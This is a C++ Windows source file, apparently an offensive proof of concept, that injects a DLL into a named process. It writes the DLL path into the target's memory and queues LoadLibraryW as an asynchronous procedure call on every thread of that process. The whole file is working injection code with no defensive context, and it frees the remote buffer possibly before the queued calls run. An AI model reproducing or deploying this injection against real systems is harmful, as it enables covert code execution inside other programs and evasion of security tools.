#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <fstream>

bool FindProcess(const char * exeName, DWORD& pid, std::vector<DWORD>& TheadIDs);


int main(int argc, const char * argv[]) {

	DWORD dwProcID;
	std::vector<DWORD> TheadIDs;
	if (FindProcess(argv[1], dwProcID, TheadIDs)) {
		std::cout << "[*] ProcID of " << argv[1] << " is " << dwProcID <<std::endl;
		HANDLE hProcessHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProcID);
		std::cout << "[+] Opened Process\n";
		if (hProcessHandle != NULL) {
			wchar_t buffer[] = L"C:\\Users\\Boudewijn\\Desktop\\theDLL64.dll";
			auto p = VirtualAllocEx(hProcessHandle, nullptr, sizeof(buffer) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			std::cout << "[+] Allocated Memory\n";
			WriteProcessMemory(hProcessHandle, p, buffer, sizeof(buffer), nullptr);
			std::cout << "[+] Written ProcMem\n";
			std::cout << "[*] Looping through the threads and queueing APC...\n";
			FARPROC LoadLibLocation = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryW");
			for (const auto& tid : TheadIDs) {
				HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
				if (hThread) {
					QueueUserAPC((PAPCFUNC)LoadLibLocation, hThread, (ULONG_PTR)p);
				}
				CloseHandle(hThread);
			}
			VirtualFreeEx(hProcessHandle, p, 0, MEM_RELEASE | MEM_DECOMMIT);
		}
		std::cout << "[*] Cleaning up...\n";
		CloseHandle(hProcessHandle);
	}
}


bool FindProcess(const char * exeName, DWORD& pid, std::vector<DWORD>& TheadIDs) {
	auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return false;
	pid = 0;
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (::Process32First(hSnapshot, &pe)) {
		do {
			if (_strcmpi(pe.szExeFile, exeName) == 0) {
				pid = pe.th32ProcessID;
				THREADENTRY32 te = { sizeof(te) };
				if (::Thread32First(hSnapshot, &te)) {
					do {
						if (te.th32OwnerProcessID == pid) {
							TheadIDs.push_back(te.th32ThreadID);
						}
					} while (::Thread32Next(hSnapshot, &te));
				}
				break;
			}
		} while (::Process32Next(hSnapshot, &pe));
	}
	CloseHandle(hSnapshot);
	return (pid > 0 && !TheadIDs.empty());
}